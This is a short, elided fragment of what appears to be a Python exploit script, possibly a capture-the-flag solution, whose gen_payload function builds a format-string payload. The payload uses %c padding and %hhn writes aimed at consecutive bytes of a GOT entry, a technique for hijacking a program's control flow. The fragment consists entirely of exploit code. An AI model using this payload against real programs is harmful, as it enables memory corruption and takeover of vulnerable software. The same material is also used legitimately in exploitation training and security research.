...
def gen_payload(got_addr, k):
    ...
    fmt = b"%214c%139$hhn%59c%140$hhn%47c%141$hhn%192c%142$hhn%143$hhn%144$hhn%145$hhn%146$hhn"
    ...
    payload += p64(got_addr + 4)
    payload += p64(got_addr + 5)
    payload += p64(got_addr + 6)
    payload += p64(got_addr + 7)
